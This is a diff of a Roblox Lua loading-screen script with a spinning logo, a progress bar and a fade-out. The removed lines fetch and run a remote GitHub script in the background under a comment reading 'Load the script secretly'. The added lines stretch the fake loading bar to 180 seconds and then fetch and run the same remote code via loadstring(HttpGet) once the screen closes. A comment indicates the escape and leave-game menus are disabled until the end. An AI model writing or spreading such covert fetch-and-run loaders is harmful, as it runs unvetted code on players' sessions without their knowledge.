@@ -34,13 +34,10 @@ robloxIcon.Parent = background
 -- Spin logic (spinning the logo)
 local rotation = 0
 local running = true
-local connection
-connection = RunService.RenderStepped:Connect(function(dt)
+RunService.RenderStepped:Connect(function(dt)
 	if running then
 		rotation = rotation + 90 * dt
 		robloxIcon.Rotation = rotation % 360
-	else
-		connection:Disconnect()
 	end
 end)
 
@@ -111,23 +108,18 @@ creditText.Size = UDim2.new(1, 0, 0.05, 0)
 creditText.Position = UDim2.new(0, 0, 0.95, 0)
 creditText.Parent = background
 
--- Background loading script (Load the script secretly)
-task.spawn(function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/main/script.lua"))()
-    end)
-    if not success then
-        warn("Failed to load external script: ", err)
-    end
-end)
+-- Loading duration setup
+local totalTime = 180
+local steps = 100
+local stepTime = totalTime / steps
 
--- Progress update loop (smoother increments)
-for i = 0, 100 do
+-- Progress update loop lasting exactly 180 seconds
+for i = 0, steps do
 	percentText.Text = i .. "%"
 
-	-- Tween progress bar smoothly over 0.018 seconds per 1%
-	local tween = TweenService:Create(progressBar, TweenInfo.new(0.018, Enum.EasingStyle.Linear), {
-		Size = UDim2.new(i / 100, 0, 1, 0)
+	-- Smooth bar tween lasting stepTime seconds
+	local tween = TweenService:Create(progressBar, TweenInfo.new(stepTime, Enum.EasingStyle.Linear), {
+		Size = UDim2.new(i / steps, 0, 1, 0)
 	})
 	tween:Play()
 
@@ -144,26 +136,41 @@ for i = 0, 100 do
 		statusText.Text = "DONE"
 	end
 
-	wait(0.018)
+	wait(stepTime)
 end
 
 -- Fade out everything once loading is complete
 for i = 1, 10 do
-	local transparency = i / 10
-	background.BackgroundTransparency = transparency
-	loadingText.TextTransparency = transparency
-	statusText.TextTransparency = transparency
-	percentText.TextTransparency = transparency
-	stroke.Transparency = transparency
-	robloxIcon.ImageTransparency = transparency
-	progressBar.BackgroundTransparency = transparency
-	progressBarBg.BackgroundTransparency = transparency
-	creditText.TextTransparency = transparency
+	background.BackgroundTransparency = i / 10
+	loadingText.TextTransparency = i / 10
+	statusText.TextTransparency = i / 10
+	percentText.TextTransparency = i / 10
+	stroke.Transparency = i / 10
+	robloxIcon.ImageTransparency = i / 10
+	progressBar.BackgroundTransparency = i / 10
+	progressBarBg.BackgroundTransparency = i / 10
+	creditText.TextTransparency = i / 10
 	wait(0.05)
 end
 
-running = false -- stops spinning logo
+running = false
 screenGui:Destroy()
 
 -- Re-enable CoreGui (Escape Menu, Leave Game, etc.)
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+
+-- Load your external script AFTER loading screen finishes
+local success, result = pcall(function()
+	return game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/main/script.lua")
+end)
+
+if success then
+	local fn, err = loadstring(result)
+	if fn then
+		fn()
+	else
+		warn("Failed to load external script:", err)
+	end
+else
+	warn("Failed to fetch external script:", result)
+end
